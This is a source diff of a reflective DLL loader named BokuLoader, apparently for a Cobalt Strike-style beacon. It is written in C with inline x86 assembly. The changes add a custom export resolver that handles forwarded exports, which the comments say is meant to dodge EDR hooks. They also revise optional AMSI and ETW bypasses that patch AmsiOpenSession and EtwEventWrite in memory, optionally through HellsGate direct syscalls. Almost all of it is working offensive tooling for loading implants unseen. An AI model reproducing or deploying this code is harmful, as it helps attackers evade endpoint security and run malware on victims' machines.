@@ -5,40 +5,13 @@
 //#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
 #include <windows.h>
 
-PVOID   getDllBase(LPCSTR) asm ("getDllBase");
-USHORT  getMachineType(PVOID) asm ("getMachineType");
-VOID    Memset(PVOID base, char c, ULONG32 size) asm ("Memset");
-VOID    Memcpy(PVOID destination, PVOID source, ULONG32 num) asm ("Memcpy");
-PVOID   getExportDirectory(PVOID dllAddr) asm ("getExportDirectory");
-PVOID   getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportAddressTable");
-PVOID   getExportNameTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportNameTable");
-PVOID   getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportOrdinalTable");
-PVOID   getSymbolAddress(PVOID symbolStr, ULONG StrSize, PVOID dllBase, PVOID AddressTable, PVOID NameTable, PVOID OrdinalTable) asm ("getSymbolAddress");
-PVOID   getRdllBase(PVOID) asm ("getRdllBase");
-PVOID   getNewExeHeader(PVOID dllBase) asm ("getNewExeHeader");
-ULONG32 getDllSize(PVOID newExeHeader) asm ("getDllSize");
-ULONG32 getDllSizeOfHeaders(PVOID newExeHeader) asm ("getDllSizeOfHeaders");
-PVOID   getOptionalHeader(PVOID NewExeHeader) asm ("getOptionalHeader");
-PVOID   getSizeOfOptionalHeader(PVOID NewExeHeader) asm ("getSizeOfOptionalHeader");
-PVOID   add(PVOID , PVOID ) asm ("add");
-ULONG32 getNumberOfSections(PVOID newExeHeaderAddr) asm ("getNumberOfSections");
-PVOID   getBeaconEntryPoint(PVOID newRdllAddr, PVOID OptionalHeaderAddr) asm ("getBeaconEntryPoint");
-PVOID   getEip(void) asm ("getEip");
-
-#ifdef SYSCALLS
-PVOID findSyscallNumber(PVOID ntdllApiAddr) asm ("findSyscallNumber");
-PVOID HellsGate(PVOID wSystemCall) asm ("HellsGate");
-PVOID HellDescent() asm ("HellDescent");
-PVOID halosGateDown(PVOID ntdllApiAddr, PVOID index) asm ("halosGateDown");
-PVOID halosGateUp(PVOID ntdllApiAddr, PVOID index) asm ("halosGateUp");
-DWORD getSyscallNumber(PVOID functionAddress) asm ("getSyscallNumber");
-#endif
-
 typedef struct Export {
-    void* Directory;
-    void* AddressTable;
-    void* NameTable;
-    void* OrdinalTable;
+    PVOID   Directory;
+    ULONG32 DirectorySize;
+    PVOID   AddressTable;
+    PVOID   NameTable;
+    PVOID   OrdinalTable;
+    ULONG32 NumberOfNames;
 }Export;
 
 typedef struct Dll {
@@ -54,7 +27,7 @@ typedef struct Dll {
     void* TextSection;
     ULONG32 TextSectionSize;
     Export Export;
-}Dll;
+}Dll, *PDll;
 
 typedef struct Section {
     void* RVA;
@@ -64,6 +37,41 @@ typedef struct Section {
     ULONG32 SizeOfSection;
     ULONG32 Characteristics;
 }Section;
+
+PVOID   getDllBase(LPCSTR) asm ("getDllBase");
+PVOID   getFirstEntry(VOID) asm ("getFirstEntry");
+PVOID   getNextEntry(PVOID currentEntry, PVOID firstEntry) asm ("getNextEntry");
+PVOID   getDllBaseFromEntry(PVOID entry) asm ("getDllBaseFromEntry");
+USHORT  getMachineType(PVOID) asm ("getMachineType");
+VOID    Memcpy(PVOID destination, PVOID source, ULONG32 num) asm ("Memcpy");
+PVOID   getExportDirectory(PVOID dllAddr) asm ("getExportDirectory");
+ULONG   getExportDirectorySize(PVOID dllAddr) asm ("getExportDirectorySize");
+PVOID   getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportAddressTable");
+PVOID   getExportNameTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportNameTable");
+PVOID   getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory) asm ("getExportOrdinalTable");
+ULONG32 getNumberOfNames(PVOID dllExportDirectory) asm ("getNumberOfNames");
+PVOID   getSymbolAddress(PVOID symbolStr, ULONG StrSize, PVOID dllBase, PVOID AddressTable, PVOID NameTable, PVOID OrdinalTable, ULONG32 NumberOfNames) asm ("getSymbolAddress");
+PVOID   xGetProcAddress(PVOID symbolStr, PDll dll);
+PVOID   getRdllBase(PVOID) asm ("getRdllBase");
+PVOID   getNewExeHeader(PVOID dllBase) asm ("getNewExeHeader");
+ULONG32 getDllSize(PVOID newExeHeader) asm ("getDllSize");
+ULONG32 getDllSizeOfHeaders(PVOID newExeHeader) asm ("getDllSizeOfHeaders");
+PVOID   getOptionalHeader(PVOID NewExeHeader) asm ("getOptionalHeader");
+PVOID   getSizeOfOptionalHeader(PVOID NewExeHeader) asm ("getSizeOfOptionalHeader");
+PVOID   add(PVOID , PVOID ) asm ("add");
+ULONG32 getNumberOfSections(PVOID newExeHeaderAddr) asm ("getNumberOfSections");
+PVOID   getBeaconEntryPoint(PVOID newRdllAddr, PVOID OptionalHeaderAddr) asm ("getBeaconEntryPoint");
+PVOID   getEip(void) asm ("getEip");
+ULONG32 copyWithDelimiter(PVOID dst, PVOID src, ULONG32 n, CHAR delimiter) asm ("copyWithDelimiter");
+
+#ifdef SYSCALLS
+PVOID findSyscallNumber(PVOID ntdllApiAddr);
+PVOID HellsGate(PVOID wSystemCall);
+PVOID HellDescent();
+PVOID halosGateDown(PVOID ntdllApiAddr, PVOID index);
+PVOID halosGateUp(PVOID ntdllApiAddr, PVOID index);
+DWORD getSyscallNumber(PVOID functionAddress);
+#endif
 
 typedef PVOID  (WINAPI * tLoadLibraryA)  (LPCSTR);
 typedef PVOID  (WINAPI * tGetProcAddress)(PVOID, LPCSTR);
@@ -107,12 +115,14 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // Get Export Directory and Export Tables for NTDLL.DLL
     char ws_ntdll[] = {'n','t','d','l','l','.','d','l','l',0};
     Dll ntdll;
-    ntdll.dllBase             = getDllBase(ws_ntdll);
-    ntdll.NewExeHeader        = getNewExeHeader(ntdll.dllBase);
-    ntdll.Export.Directory    = getExportDirectory(ntdll.dllBase);
-    ntdll.Export.AddressTable = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
-    ntdll.Export.NameTable    = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
-    ntdll.Export.OrdinalTable = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
+    ntdll.dllBase              = getDllBase(ws_ntdll);
+    ntdll.NewExeHeader         = getNewExeHeader(ntdll.dllBase);
+    ntdll.Export.Directory     = getExportDirectory(ntdll.dllBase);
+    ntdll.Export.DirectorySize = getExportDirectorySize(ntdll.dllBase);
+    ntdll.Export.AddressTable  = getExportAddressTable(ntdll.dllBase, ntdll.Export.Directory);
+    ntdll.Export.NameTable     = getExportNameTable(ntdll.dllBase, ntdll.Export.Directory);
+    ntdll.Export.OrdinalTable  = getExportOrdinalTable(ntdll.dllBase, ntdll.Export.Directory);
+    ntdll.Export.NumberOfNames = getNumberOfNames(ntdll.Export.Directory);
 
     // check that the rDLL is the same architecture as the host process
     if(getMachineType(rdll_src.NewExeHeader) != getMachineType(ntdll.NewExeHeader)) {
@@ -122,35 +132,34 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // Get Export Directory and Export Tables for Kernel32.dll
     char ws_k32[] = {'K','E','R','N','E','L','3','2','.','D','L','L',0};
     Dll k32;
-    k32.dllBase               = getDllBase(ws_k32);
-    k32.Export.Directory      = getExportDirectory(k32.dllBase);
-    k32.Export.AddressTable   = getExportAddressTable(k32.dllBase, k32.Export.Directory);
-    k32.Export.NameTable      = getExportNameTable(k32.dllBase, k32.Export.Directory);
-    k32.Export.OrdinalTable   = getExportOrdinalTable(k32.dllBase, k32.Export.Directory);
+    k32.dllBase              = getDllBase(ws_k32);
+    k32.Export.Directory     = getExportDirectory(k32.dllBase);
+    k32.Export.DirectorySize = getExportDirectorySize(k32.dllBase);
+    k32.Export.AddressTable  = getExportAddressTable(k32.dllBase, k32.Export.Directory);
+    k32.Export.NameTable     = getExportNameTable(k32.dllBase, k32.Export.Directory);
+    k32.Export.OrdinalTable  = getExportOrdinalTable(k32.dllBase, k32.Export.Directory);
+    k32.Export.NumberOfNames = getNumberOfNames(k32.Export.Directory);
 
     char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
-    tLoadLibraryA pLoadLibraryA     = (tLoadLibraryA)  getSymbolAddress(kstr1, 12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
-
-    char kstr2[] = {'G','e','t','P','r','o','c','A',0};
-    tGetProcAddress pGetProcAddress = (tGetProcAddress)getSymbolAddress(kstr2, 8,  k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
+    tLoadLibraryA pLoadLibraryA = xGetProcAddress(kstr1, &k32);
 
     char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
-    tNtFlush pNtFlushInstructionCache = getSymbolAddress(ntstr1, 23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
+    tNtFlush pNtFlushInstructionCache = xGetProcAddress(ntstr1, &ntdll);
 
     char ntstr2[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
-    tNtAlloc pNtAllocateVirtualMemory = getSymbolAddress(ntstr2, 23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
+    tNtAlloc pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);
 
     char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
-    tNtProt pNtProtectVirtualMemory = getSymbolAddress(ntstr3, 22, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
+    tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
 
     #ifdef NOHEADERCOPY
     char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
-    tNtFree pNtFreeVirtualMemory = getSymbolAddress(ntstr4, 19, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
+    tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
     #endif
 
     // AMSI & ETW Optional Bypass
     #ifdef BYPASS
-    bypass(&ntdll, &k32, pLoadLibraryA);
+    bypass(&ntdll, &k32, pLoadLibraryA, pNtProtectVirtualMemory);
     #endif
 
     // Allocate new memory to write our new RDLL too
@@ -246,7 +255,6 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // Get the Address of the Import Directory from the Data Directory
     void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
     LPCSTR importName;
-    ULONG len_EntryName;
     __asm__(
         "mov ebx, [eax] \n" // RVA of Import Directory
         "add edx, ebx \n"   // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
@@ -297,10 +305,12 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         );
         while(nullCheck)
         {
-            dll_import.Export.Directory    = getExportDirectory(dll_import.dllBase);
-            dll_import.Export.AddressTable = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
-            dll_import.Export.NameTable    = getExportNameTable(dll_import.dllBase, dll_import.Export.Directory);
-            dll_import.Export.OrdinalTable = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);
+            dll_import.Export.Directory     = getExportDirectory(dll_import.dllBase);
+            dll_import.Export.DirectorySize = getExportDirectorySize(dll_import.dllBase);
+            dll_import.Export.AddressTable  = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
+            dll_import.Export.NameTable     = getExportNameTable(dll_import.dllBase, dll_import.Export.Directory);
+            dll_import.Export.OrdinalTable  = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);
+            dll_import.Export.NumberOfNames = getNumberOfNames(dll_import.Export.Directory);
 
             if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
             {
@@ -352,26 +362,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
                     : "r" (AddressTableEntry), // EAX IN = import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                       "r" (rdll_dst.dllBase)   // EDX IN
                 );
-                __asm__(
-                    "xor ecx, ecx \n"        // Get the string length for the import function name
-                    "countLoop: \n"
-                    "inc cl \n"              // increment the name string length counter
-                    "xor ebx, ebx \n"
-                    "cmp bl, [eax] \n"       // are we at the null terminator for the string?
-                    "je fStrLen \n"
-                    "inc eax \n"             // move to the next char of the string
-                    "jmp short countLoop \n"
-                    "fStrLen: \n"
-                    "xchg eax, ecx \n"
-                    : "=r" (len_EntryName) // EAX OUT
-                    : "r" (EntryName)      // EAX IN
-                );
-                // use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
-                EntryAddress = getSymbolAddress(EntryName, len_EntryName, dll_import.dllBase, dll_import.Export.AddressTable, dll_import.Export.NameTable, dll_import.Export.OrdinalTable);
-                // If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
-                if (EntryAddress == NULL){
-                    EntryAddress = pGetProcAddress((HMODULE)dll_import.dllBase, (char*)EntryName);
-                }
+                // use xGetProcAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
+                EntryAddress = xGetProcAddress(EntryName, &dll_import);
                 __asm__(
                     "mov [eax], edx \n" // write the address of the imported api to our import table
                     : // no outputs
@@ -504,6 +496,112 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     return rdll_dst.EntryPoint;
 }
 
+PVOID xGetProcAddress(PVOID symbolStr, PDll dll)
+{
+    CHAR  dll_name[64];
+    CHAR  api_name[128];
+    DWORD api_length, i;
+    Dll   ref_dll;
+    PVOID firstEntry;
+    PVOID currentEntry;
+    DWORD StrSize;
+
+    // if there is no export directory, return NULL
+    if (!dll->Export.DirectorySize)
+        return NULL;
+
+    __asm__(
+        "xor ecx, ecx \n"        // Get the string length for the import function name
+        "countLoop: \n"
+        "inc cl \n"              // increment the name string length counter
+        "xor ebx, ebx \n"
+        "cmp bl, [eax] \n"       // are we at the null terminator for the string?
+        "je fStrLen \n"
+        "inc eax \n"             // move to the next char of the string
+        "jmp short countLoop \n"
+        "fStrLen: \n"
+        "xchg eax, ecx \n"
+        : "=r" (StrSize)  // EAX OUT
+        : "r" (symbolStr) // EAX IN
+    );
+
+    PVOID address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);
+
+    // if not found, return NULL
+    if (!address)
+        return NULL;
+
+    // is this a forward reference?
+    if ((ULONG_PTR)address >= (ULONG_PTR)dll->Export.Directory &&
+        (ULONG_PTR)address <  (ULONG_PTR)dll->Export.Directory + dll->Export.DirectorySize)
+    {
+        // copy DLL name
+        i = copyWithDelimiter(dll_name, address, sizeof(dll_name) - 4, '.');
+        i--;
+        dll_name[i+1] = 'd';
+        dll_name[i+2] = 'l';
+        dll_name[i+3] = 'l';
+        dll_name[i+4] = 0;
+
+        address += i + 1;
+
+        // copy API name
+        i = copyWithDelimiter(api_name, address, sizeof(api_name) - 1, 0);
+        i--;
+        api_name[i] = 0;
+        api_length = i + 1;
+
+        // see if the DLL is already loaded
+        ref_dll.dllBase = getDllBase(dll_name);
+        if (ref_dll.dllBase)
+        {
+            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
+            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
+            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
+            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
+            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
+            return xGetProcAddress(api_name, &ref_dll);
+        }
+
+        // the DLL was not found by name
+        // loop over each loaded DLL until we find the correct one
+        firstEntry = getFirstEntry();
+        currentEntry = firstEntry;
+        do
+        {
+            ref_dll.dllBase = getDllBaseFromEntry(currentEntry);
+            // ignore the original DLL with the reference
+            if (ref_dll.dllBase == dll->dllBase)
+            {
+                currentEntry = getNextEntry(currentEntry, firstEntry);
+                continue;
+            }
+
+            ref_dll.Export.Directory     = getExportDirectory(ref_dll.dllBase);
+            ref_dll.Export.DirectorySize = getExportDirectorySize(ref_dll.dllBase);
+            // make sure it has an export directory
+            if (!ref_dll.Export.DirectorySize)
+            {
+                currentEntry = getNextEntry(currentEntry, firstEntry);
+                continue;
+            }
+            ref_dll.Export.AddressTable  = getExportAddressTable(ref_dll.dllBase, ref_dll.Export.Directory);
+            ref_dll.Export.NameTable     = getExportNameTable(ref_dll.dllBase, ref_dll.Export.Directory);
+            ref_dll.Export.OrdinalTable  = getExportOrdinalTable(ref_dll.dllBase, ref_dll.Export.Directory);
+            ref_dll.Export.NumberOfNames = getNumberOfNames(ref_dll.Export.Directory);
+            // try to find 'api_name' in this DLL
+            address = getSymbolAddress(api_name, api_length, ref_dll.dllBase, ref_dll.Export.AddressTable, ref_dll.Export.NameTable, ref_dll.Export.OrdinalTable, ref_dll.Export.NumberOfNames);
+            // found?
+            if (address)
+                break;
+            // try the next DLL
+            currentEntry = getNextEntry(currentEntry, firstEntry);
+        } while(currentEntry);
+    }
+
+    return address;
+}
+
 #ifdef BYPASS
 void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtectVirtualMemory){
     LONG32 status;
@@ -520,47 +618,50 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtec
     }
 
     if (amsi.dllBase != NULL) {
-        amsi.Export.Directory      = getExportDirectory(amsi.dllBase);
-        amsi.Export.AddressTable   = getExportAddressTable(amsi.dllBase, amsi.Export.Directory);
-        amsi.Export.NameTable      = getExportNameTable(amsi.dllBase, amsi.Export.Directory);
-        amsi.Export.OrdinalTable   = getExportOrdinalTable(amsi.dllBase, amsi.Export.Directory);
+        amsi.Export.Directory     = getExportDirectory(amsi.dllBase);
+        amsi.Export.AddressTable  = getExportAddressTable(amsi.dllBase, amsi.Export.Directory);
+        amsi.Export.NameTable     = getExportNameTable(amsi.dllBase, amsi.Export.Directory);
+        amsi.Export.OrdinalTable  = getExportOrdinalTable(amsi.dllBase, amsi.Export.Directory);
+        amsi.Export.NumberOfNames = getNumberOfNames(amsi.Export.Directory);
         char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
-        void* pAmsiOpenSession  = getSymbolAddress(aoses, 15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);
+        void* pAmsiOpenSession  = xGetProcAddress(aoses, &amsi);
+        if (pAmsiOpenSession) {
 
-        unsigned char amsibypass[] = { 0x31, 0xC0 }; // xor eax, eax
-        Base = pAmsiOpenSession;
-        Size = sizeof(amsibypass);
+            unsigned char amsibypass[] = { 0x31, 0xC0 }; // xor eax, eax
+            Base = pAmsiOpenSession;
+            Size = sizeof(amsibypass);
 
-        #ifdef SYSCALLS
-        // make memory region RWX
-        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-        status = HellDescent(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        // write the bypass
-        Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
-        // make memory region RX again
-        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-        status = HellDescent(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        #else
-        // make memory region RWX
-        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        // write the bypass
-        Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
-        // make memory region RX again
-        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
-        if (!NT_SUCCESS(status))
-            return;
-        #endif
+            #ifdef SYSCALLS
+            // make memory region RWX
+            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
+            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+            if (!NT_SUCCESS(status))
+                return;
+            // write the bypass
+            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
+            // make memory region RX again
+            HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
+            status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
+            if (!NT_SUCCESS(status))
+                return;
+            #else
+            // make memory region RWX
+            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+            if (!NT_SUCCESS(status))
+                return;
+            // write the bypass
+            Memcpy(pAmsiOpenSession, amsibypass, sizeof(amsibypass));
+            // make memory region RX again
+            status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
+            if (!NT_SUCCESS(status))
+                return;
+            #endif
+        }
     }
 
     // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
     char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
-    void* pEtwEventWrite  = getSymbolAddress(eew, 13, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
+    void* pEtwEventWrite  = xGetProcAddress(eew, ntdll);
 
     if (pEtwEventWrite != NULL) {
         unsigned char etwbypass[] = { 0xc3 }; // ret
@@ -569,14 +670,14 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, tNtProt pNtProtec
         #ifdef SYSCALLS
         // make memory region RWX
         HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-        status = HellDescent(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
         if (!NT_SUCCESS(status))
             return;
         // write the bypass
         Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
         // make memory region RX again
         HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-        status = HellDescent(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
+        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
         if (!NT_SUCCESS(status))
             return;
         #else
@@ -653,6 +754,24 @@ __asm__(
     "mov eax, [ebx+0x10] \n"       // DllBase Address in process memory
 "end: \n"
     "ret \n"
+"getFirstEntry: \n"
+    "mov eax, fs:[0x30] \n"        // ProcessEnvironmentBlock // FS = TEB
+    "mov eax, [eax+0x0c] \n"       // _PEB_LDR_DATA
+    "mov eax, [eax+0x14] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
+    "ret \n"
+"getNextEntry: \n"
+    "mov ecx, [esp+0x4] \n"
+    "mov edx, [esp+0x8] \n"
+    "mov eax, [ecx] \n"
+    "cmp edx, [eax] \n"            // Are we back at the same entry in the list?
+    "jne notTheLast \n"
+    "xor eax, eax \n"
+"notTheLast: \n"
+    "ret \n"
+"getDllBaseFromEntry: \n"
+    "mov ecx, [esp+0x4] \n"
+    "mov eax, [ecx+0x10] \n"
+    "ret \n"
 "cmpstrings: \n"
     "xor eax, eax \n"              // counter
 "cmpchar: \n"
@@ -687,6 +806,12 @@ __asm__(
     "mov edx, [ebx+0x78] \n"       // RVA to ExportDirectory
     "add eax, edx \n"              // ExportDirectory
     "ret \n" // return ExportDirectory
+"getExportDirectorySize: \n"
+    "mov eax, [esp+0x4] \n"
+    "mov ebx, [eax+0x3C] \n"
+    "add ebx, eax \n"
+    "mov eax, [ebx+0x7c] \n"
+    "ret \n" // return ExportDirectory Size;
 "getExportAddressTable: \n"
     "mov ecx, [esp+0x4] \n"        // dllAddr
     "mov edx, [esp+0x8] \n"        // dllExportDirectory
@@ -708,9 +833,14 @@ __asm__(
     "mov eax, [edx] \n"            // RVAExportAddressOfNameOrdinals (Value/RVA)
     "add eax, ecx \n"              // VA ExportAddressOfNameOrdinals
     "ret \n" // return ExportOrdinalTable;
+"getNumberOfNames: \n"
+    "mov ecx, [esp+0x4] \n"
+    "mov eax, [ecx+0x18] \n"
+    "ret \n"
 "getSymbolAddress: \n"
     "mov edx, [esp+0x14] \n"       // ExportNameTable
-    "xor eax, eax \n"
+    "mov eax, [esp+0x1c] \n"
+    "dec eax \n"
 "lFindSym: \n"
     "mov ecx, [esp+0x8] \n"        // DWORD symbolStringSize (Reset string length counter for each loop)
     "mov edi, [edx+eax*4] \n"      // RVA NameString = [&NamePointerTable + (Counter * 4)]
@@ -718,7 +848,9 @@ __asm__(
     "mov esi, [esp+0x4] \n"        // Address of API Name String to match on the Stack (reset to start of string)
     "repe cmpsb \n"                // Compare strings at RDI & RSI
     "je FoundSym \n"               // If match then we found the API string. Now we need to find the Address of the API
-    "inc eax \n"                   // Increment to check if the next name matches
+    "test eax, eax \n"
+    "je NotFoundSym \n"            // If we check every exported function, return NULL
+    "dec eax \n"                   // Increment to check if the next name matches
     "jmp short lFindSym \n"        // Jump back to start of loop
 "FoundSym: \n"
     "mov ebx, [esp+0x18] \n"       // ExportOrdinalTable
@@ -729,10 +861,9 @@ __asm__(
     "add eax, ebx \n"              // module.<API> = RVA module.<API> + module.dll BaseAddress
     "mov ebx, [esp+0xc] \n"        // dllBase
     "mov ebx, [esp+0x18] \n"       // ExportOrdinalTable
-    "sub ebx, eax \n"              // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
-    "jns notForwarder \n"          // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
-    "xor eax, eax \n"              // If forwarder, return 0x0 and exit
-"notForwarder: \n"
+    "ret \n"
+"NotFoundSym:\n"
+    "xor eax, eax \n"
     "ret \n"
 "getNewExeHeader: \n"
     "mov ecx, [esp+0x4] \n"        // dllBase
@@ -765,19 +896,6 @@ __asm__(
     "test eax, eax \n"             // check if eax = 0
     "jne copy1 \n"                 // if eax != 0, then write next byte via loop
     "ret \n"
-"Memset: \n"
-    "mov eax, [esp+0x4] \n"        // base
-    "mov ebx, [esp+0x8] \n"        // c
-    "mov ecx, [esp+0xc] \n"        // size
-"domemset: \n"
-    "cmp ecx, 0x0 \n"
-    "je donesetting \n"
-    "mov [eax], bl \n"
-    "inc eax \n"
-    "dec ecx \n"
-    "jmp domemset \n"
-"donesetting: \n"
-    "ret \n"
 "getOptionalHeader: \n"
     "mov eax, [esp+0x4] \n"        // NewExeHeader
     "add eax, 0x18 \n"
@@ -807,6 +925,25 @@ __asm__(
     "mov eax, [edx] \n"
     "add eax, ecx \n"              // newRdllAddr.EntryPoint
     "ret \n" // return newRdllAddrEntryPoint
+"copyWithDelimiter: \n"
+    "mov ecx, [esp+0x04] \n"       // dst
+    "mov edi, [esp+0x08] \n"       // src
+    "mov esi, [esp+0x0c] \n"       // n
+    "mov edx, [esp+0x10] \n"       // delimiter
+    "xor eax, eax \n"              // number of bytes copied
+    "copyLoop: \n"
+    "cmp esi, eax \n"              // check if we copied enough bytes
+    "je copydone \n"
+    "mov bl, [edi] \n"             // read byte
+    "mov [ecx], bl \n"             // write byte
+    "inc edi \n"
+    "inc ecx \n"
+    "inc eax \n"                   // increment bytes written
+    "cmp bl, dl \n"                // check if we found the delimiter
+    "je copydone\n"
+    "jmp copyLoop \n"
+    "copydone: \n"
+    "ret \n"
 );
 
 #ifdef SYSCALLS
